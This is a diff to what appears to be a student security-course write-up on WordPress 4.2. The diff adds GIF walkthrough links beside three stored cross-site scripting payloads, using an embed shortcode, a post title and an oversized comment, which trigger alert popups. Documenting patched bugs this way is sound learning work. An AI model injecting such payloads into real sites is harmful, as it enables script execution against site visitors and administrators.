@@ -11,7 +11,7 @@ Time spent: **4** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.13
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: ![](https://github.com/Azhao19/Cybersecurity2021/blob/wp_exploits/Vuln1notYT.gif)
   - [ ] Steps to recreate: In the content of a post, enter the following:
         ```
         $ [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(12312313)\x3e'][/embed]
@@ -24,7 +24,7 @@ Time spent: **4** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.3
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: ![] (https://github.com/Azhao19/Cybersecurity2021/blob/wp_exploits/Vuln2YT.gif)
   - [ ] Steps to recreate: In the title of a post, enter the following:
         ```
         $ <a href="</a><a title=" onmouseover=alert('xss')  ">link</a>
@@ -36,7 +36,7 @@ Time spent: **4** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: ![] (https://github.com/Azhao19/Cybersecurity2021/blob/wp_exploits/Vuln3BIG.gif)
   - [ ] Steps to recreate: Suppose LARGE represents a 64 KB block of text. Then enter this into a comment:
         ```
         $ <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px LARGE'></a>
